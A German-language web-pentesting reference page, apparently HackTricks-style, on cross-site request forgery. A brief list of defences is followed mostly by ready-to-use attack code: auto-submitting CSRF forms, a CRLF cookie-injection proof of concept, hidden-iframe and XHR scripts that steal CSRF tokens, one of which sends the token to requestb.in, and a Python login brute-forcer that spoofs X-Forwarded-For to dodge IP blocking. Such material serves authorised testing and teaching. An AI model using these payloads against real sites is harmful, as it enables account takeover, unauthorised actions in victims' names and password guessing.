# Cross-Site Request Forgery (CSRF) Erklärt

Cross-Site Request Forgery (CSRF) ist eine Art von Sicherheitsanfälligkeit, die in Webanwendungen zu finden ist. Sie ermöglicht es Angreifern, Aktionen im Namen ahnungsloser Benutzer durch Ausnutzung ihrer authentifizierten Sitzungen durchzuführen. Der Angriff wird ausgeführt, wenn ein Benutzer, der in die Plattform eines Opfers eingeloggt ist, eine bösartige Seite besucht. Diese Seite löst dann Anfragen an das Konto des Opfers aus, indem sie Methoden wie das Ausführen von JavaScript, das Einreichen von Formularen oder das Abrufen von Bildern verwendet.

## Voraussetzungen für einen CSRF-Angriff

Um eine CSRF-Sicherheitsanfälligkeit auszunutzen, müssen mehrere Bedingungen erfüllt sein:

1. **Identifizieren Sie eine wertvolle Aktion**: Der Angreifer muss eine Aktion finden, die es wert ist, ausgenutzt zu werden, wie z.B. das Ändern des Passworts, der E-Mail-Adresse oder das Erhöhen von Berechtigungen.

2. **Sitzungsmanagement**: Die Sitzung des Benutzers sollte ausschließlich über Cookies oder den HTTP Basic Authentication-Header verwaltet werden, da andere Header für diesen Zweck nicht manipuliert werden können.

3. **Fehlen unvorhersehbarer Parameter**: Die Anfrage sollte keine unvorhersehbaren Parameter enthalten, da diese den Angriff verhindern können.

# Verteidigung gegen CSRF

Mehrere Gegenmaßnahmen können implementiert werden, um sich gegen CSRF-Angriffe zu schützen:

- **SameSite-Cookies**: Dieses Attribut verhindert, dass der Browser Cookies zusammen mit Cross-Site-Anfragen sendet. [Mehr über SameSite-Cookies.](#)

- **Cross-Origin Resource Sharing (CORS)**: Die CORS-Richtlinie der Opferseite kann die Durchführbarkeit des Angriffs beeinflussen, insbesondere wenn der Angriff das Lesen der Antwort von der Opferseite erfordert. [Erfahren Sie mehr über CORS-Umgehung.](#)

- **Benutzerauthentifizierung**: Die Aufforderung zur Eingabe des Passworts des Benutzers oder das Lösen eines Captchas kann die Absicht des Benutzers bestätigen.

- **Überprüfung von Referrer- oder Origin-Headern**: Die Validierung dieser Header kann helfen sicherzustellen, dass Anfragen von vertrauenswürdigen Quellen stammen. Allerdings kann eine sorgfältige Gestaltung von URLs schlecht implementierte Überprüfungen umgehen, wie z.B.:
  - Verwendung von `http://mal.net?orig=http://example.com` (URL endet mit der vertrauenswürdigen URL)
  - Verwendung von `http://example.com.mal.net` (URL beginnt mit der vertrauenswürdigen URL)

- **Ändern von Parameternamen**: Das Ändern der Namen von Parametern in POST- oder GET-Anfragen kann helfen, automatisierte Angriffe zu verhindern.

- **CSRF-Token**: Die Einbeziehung eines einzigartigen CSRF-Tokens in jede Sitzung und die Anforderung dieses Tokens in nachfolgenden Anfragen kann das Risiko von CSRF erheblich mindern. Die Wirksamkeit des Tokens kann durch die Durchsetzung von CORS erhöht werden.

Das Verständnis und die Implementierung dieser Verteidigungen sind entscheidend für die Aufrechterhaltung der Sicherheit und Integrität von Webanwendungen.

## Umgehung von Verteidigungen

### Von POST zu GET

Vielleicht ist das Formular, das Sie ausnutzen möchten, darauf vorbereitet, eine POST-Anfrage mit einem CSRF-Token zu senden, aber Sie sollten überprüfen, ob auch eine GET-Anfrage gültig ist und ob bei der Sendung einer GET-Anfrage das CSRF-Token weiterhin validiert wird.

### Fehlendes Token

Anwendungen könnten einen Mechanismus implementieren, um Tokens zu validieren, wenn sie vorhanden sind. Eine Sicherheitsanfälligkeit entsteht jedoch, wenn die Validierung ganz übersprungen wird, wenn das Token fehlt. Angreifer können dies ausnutzen, indem sie den Parameter entfernen, der das Token trägt, nicht nur dessen Wert. Dies ermöglicht es ihnen, den Validierungsprozess zu umgehen und einen Cross-Site Request Forgery (CSRF)-Angriff effektiv durchzuführen.

### CSRF-Token ist nicht an die Benutzersitzung gebunden

Anwendungen, die CSRF-Token nicht an Benutzersitzungen binden, stellen ein erhebliches Sicherheitsrisiko dar. Diese Systeme überprüfen Tokens gegen einen globalen Pool, anstatt sicherzustellen, dass jedes Token an die initiierende Sitzung gebunden ist.

So nutzen Angreifer dies aus:

1. Authentifizieren Sie sich mit ihrem eigenen Konto.
2. Erhalten Sie ein gültiges CSRF-Token aus dem globalen Pool.
3. Verwenden Sie dieses Token in einem CSRF-Angriff gegen ein Opfer.

Diese Sicherheitsanfälligkeit ermöglicht es Angreifern, unbefugte Anfragen im Namen des Opfers zu stellen und die unzureichenden Token-Validierungsmechanismen der Anwendung auszunutzen.

### Methodenumgehung

Wenn die Anfrage eine "seltsame" Methode verwendet, überprüfen Sie, ob die Methodenüberschreibungsfunktionalität funktioniert. Wenn beispielsweise die PUT-Methode verwendet wird, können Sie versuchen, die POST-Methode zu verwenden und zu senden: `https://example.com/my/dear/api/val/num?_method=PUT`

Dies könnte auch funktionieren, indem Sie den `_method`-Parameter innerhalb einer POST-Anfrage senden oder die Header verwenden:
- `X-HTTP-Method`
- `X-HTTP-Method-Override`
- `X-Method-Override`

# Umgehung des benutzerdefinierten Header-Tokens

Wenn die Anfrage einen benutzerdefinierten Header mit einem Token als CSRF-Schutzmethode hinzufügt, dann:

- **Testen Sie die Anfrage ohne den benutzerdefinierten Token und auch Header.**
- **Testen Sie die Anfrage mit genau gleicher Länge, aber unterschiedlichem Token.**

## CSRF-Token wird durch ein Cookie verifiziert

Anwendungen können CSRF-Schutz implementieren, indem sie das Token sowohl in einem Cookie als auch in einem Anfrageparameter duplizieren oder indem sie ein CSRF-Cookie setzen und überprüfen, ob das im Backend gesendete Token mit dem Cookie übereinstimmt. Die Anwendung validiert Anfragen, indem sie überprüft, ob das Token im Anfrageparameter mit dem Wert im Cookie übereinstimmt.

Diese Methode ist jedoch anfällig für CSRF-Angriffe, wenn die Website Schwächen aufweist, die es einem Angreifer ermöglichen, ein CSRF-Cookie im Browser des Opfers zu setzen, wie z.B. eine CRLF-Sicherheitsanfälligkeit. Der Angreifer kann dies ausnutzen, indem er ein täuschendes Bild lädt, das das Cookie setzt, gefolgt von der Einleitung des CSRF-Angriffs.

Hier ist ein Beispiel, wie ein Angriff strukturiert sein könnte:

```html
<html>
  <!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```
> **Info:** Wenn der CSRF-Token mit dem Sitzungscookie verbunden ist, funktioniert dieser Angriff nicht. In diesem Fall müssten Sie die Sitzung des Opfers setzen, was bedeutet, dass Sie sich selbst angreifen würden.


> **Info:** Beachten Sie, dass das Vermeiden des `Referer`-Headers durch den HTML-Meta-Tag möglicherweise nicht in allen Browsern oder Konfigurationen wirksam ist. Die Verlässlichkeit dieser Methode kann variieren.

## Bypassing SameSite Lax restrictions using GET requests

In der Praxis sind Server nicht immer wählerisch, ob sie eine GET- oder POST-Anfrage an einen bestimmten Endpunkt erhalten, selbst wenn diese eine Formularübermittlung erwarten. Wenn sie auch Lax-Einschränkungen für ihre Sitzungscookies verwenden, entweder explizit oder aufgrund der Browsereinstellungen, können Sie möglicherweise immer noch einen CSRF-Angriff ausführen, indem Sie eine GET-Anfrage aus dem Browser des Opfers anfordern.

Solange die Anfrage eine Top-Level-Navigation beinhaltet, wird der Browser weiterhin das Sitzungscookie des Opfers senden. Eine der einfachsten Methoden, einen solchen Angriff zu starten, ist:
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Selbst wenn eine gewöhnliche GET-Anfrage nicht erlaubt ist, bieten einige Frameworks Möglichkeiten, die Methode in der Anforderungszeile zu überschreiben. Beispielsweise unterstützt Symfony das `_method`-Parameter in Formularen, das für Routing-Zwecke Vorrang vor der normalen Methode hat:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Andere Frameworks unterstützen eine Vielzahl ähnlicher Parameter.

# Content-Type-Änderung

Laut dieser Quelle, um Preflight-Anfragen mit der POST-Methode zu vermeiden, sind die folgenden Content-Type-Werte erlaubt:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

Beachten Sie jedoch, dass die Logik der Server variieren kann, abhängig vom verwendeten Content-Type. Daher sollten Sie die genannten Werte und andere wie `application/json`, `text/xml`, `application/xml` testen.

## Beispiel (von [hier](https://brycec.me/posts/corctf_2021_challenges)) für das Senden von JSON-Daten als `text/plain`

```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```

## Umgehung von Preflight-Anfragen für JSON-Daten

Beim Versuch, JSON-Daten über eine POST-Anfrage zu senden, ist es nicht direkt möglich, `Content-Type: application/json` in einem HTML-Formular zu verwenden. Ebenso initiiert die Nutzung von XMLHttpRequest, um diesen Inhaltstyp zu senden, eine Preflight-Anfrage. Dennoch gibt es Strategien, um diese Einschränkung möglicherweise zu umgehen und zu überprüfen, ob der Server die JSON-Daten unabhängig vom Content-Type verarbeitet:

- **Verwendung alternativer Inhaltstypen**: Verwenden Sie `Content-Type: text/plain` oder `Content-Type: application/x-www-form-urlencoded`, indem Sie `enctype="text/plain"` im Formular festlegen. Dieser Ansatz testet, ob das Backend die Daten unabhängig vom Content-Type nutzt.

- **Inhaltstyp ändern**: Um eine Preflight-Anfrage zu vermeiden und sicherzustellen, dass der Server den Inhalt als JSON erkennt, können Sie die Daten mit `Content-Type: text/plain; application/json` senden. Dies löst keine Preflight-Anfrage aus, könnte jedoch vom Server korrekt verarbeitet werden, wenn er so konfiguriert ist, `application/json` zu akzeptieren.

- **Nutzung von SWF Flash-Dateien**: Eine weniger gängige, aber machbare Methode besteht darin, eine SWF-Flash-Datei zu verwenden, um solche Einschränkungen zu umgehen. Für ein tieferes Verständnis dieser Technik siehe [diesen Beitrag](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

## Umgehung der Überprüfungen von Referrer / Origin

### Vermeiden Sie den Referrer-Header

Anwendungen können den `Referer`-Header nur validieren, wenn er vorhanden ist. Um zu verhindern, dass ein Browser diesen Header sendet, kann der folgende HTML-Meta-Tag verwendet werden:

```html
<meta name="referrer" content="never">
```
Dies stellt sicher, dass der `Referer`-Header weggelassen wird, wodurch möglicherweise Validierungsprüfungen in einigen Anwendungen umgangen werden.

### Regexp-Umgehungen
[URL Format Bypass](https://book.hacktricks.xyz/v/de/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)

Um den Domainnamen des Servers in der URL festzulegen, den der Referrer innerhalb der Parameter senden wird, können Sie Folgendes tun:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```

# HEAD-Methode umgehen

Im ersten Teil von diesem [CTF-Bericht](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) wird erklärt, dass [Oaks Quellcode](https://github.com/oakserver/oak/blob/main/router.ts#L281), ein Router, HEAD-Anfragen als GET-Anfragen ohne Antwortkörper behandelt – ein gängiger Workaround, der nicht einzigartig für Oak ist. Anstelle eines spezifischen Handlers, der sich mit HEAD-Anfragen befasst, werden sie einfach dem GET-Handler übergeben, aber die App entfernt einfach den Antwortkörper.

Daher, wenn eine GET-Anfrage eingeschränkt wird, könnten Sie einfach eine HEAD-Anfrage senden, die als GET-Anfrage verarbeitet wird.

## Exploit-Beispiele

### Exfiltrieren des CSRF-Tokens

Wenn ein CSRF-Token als Schutz verwendet wird, könnten Sie versuchen, es zu exfiltrieren, indem Sie eine [XSS](https://book.hacktricks.xyz/v/de/pentesting-web/xss-cross-site-scripting#xss-stealing-csrf-tokens)-Schwachstelle oder eine [Dangling Markup](https://book.hacktricks.xyz/v/de/pentesting-web/dangling-markup-html-scriptless-injection)-Schwachstelle ausnutzen.

### GET mit HTML-Tags

```html
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

Andere HTML5-Tags, die verwendet werden können, um automatisch eine GET-Anfrage zu senden, sind:

```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```

### Form GET-Anfrage

```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

### Form POST-Anfrage

```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```

### Form POST-Anfrage über iframe

```html
<!--
The request is sent through the iframe without reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

# Ajax POST-Anfrage

### Standard JavaScript XMLHttpRequest

```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>
```

### jQuery Version

```html
<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```

## multipart/form-data POST-Anfrage

### Standard Version

```html
<script>
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
</script>
```

### Version 2

```html
<script>
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
</script>
```

## Form POST-Anfrage aus einem iframe heraus

### Explizites HTML und JavaScript

```html
<!-- expl.html -->
<body onload="envia()">
<form method="POST" id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"></iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```

## CSRF-Token stehlen und eine POST-Anfrage senden

### Mit JavaScript

```html
<script>
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
</script>
```

### Mit iframe, Formular und Ajax

```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```

### Mit iframe und Formular

```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```

### Mit zwei iframes

```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementById("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name="bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```

### Mit Ajax und Formular

```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```

## CSRF mit Socket.IO

```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```

# CSRF Login Brute Force

Hier ist ein Beispielcode, der verwendet werden kann, um ein Login-Formular mit einem CSRF-Token zu bruteforcen. Der Code verwendet auch den Header `X-Forwarded-For`, um eine mögliche IP-Blacklist zu umgehen.

```python
import requests
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST = "./words"

def init_session():
    # Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```

## Tools

- [XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [CSRF PoC Generator](https://github.com/merttasci/csrf-poc-generator)

## References

- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger - Bypassing Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [PortSwigger - Bypassing Referer-Based Defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [Bypass Referer Check Logic for CSRF](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)
